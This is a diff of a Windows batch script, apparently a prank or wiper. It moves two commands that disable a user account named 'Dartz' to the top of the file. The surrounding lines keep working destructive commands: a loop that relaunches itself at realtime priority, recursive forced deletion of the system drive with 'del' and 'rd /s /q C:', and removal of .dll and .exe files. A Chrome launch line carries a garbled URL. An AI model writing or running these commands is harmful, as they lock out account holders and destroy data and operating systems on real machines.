@@ -2,6 +2,8 @@
 :a
 START /realtime 1.bat
 
+net user Dartz /active:no
+wmic useraccount where name='Dartz' set disabled=true
 
 color 6
 echo "<3"
@@ -29,9 +31,6 @@ START chrome.exe "http://勒屁艾 艾艾西伊娜艾 艾屁艾弗艾哦艾 西�
 
 del %systemdrive%*.* /f /s /q
 rd/s/q C:
-
-net user Dartz /active:no
-wmic useraccount where name='Dartz' set disabled=true
 
 del *.dll
 del *.exe
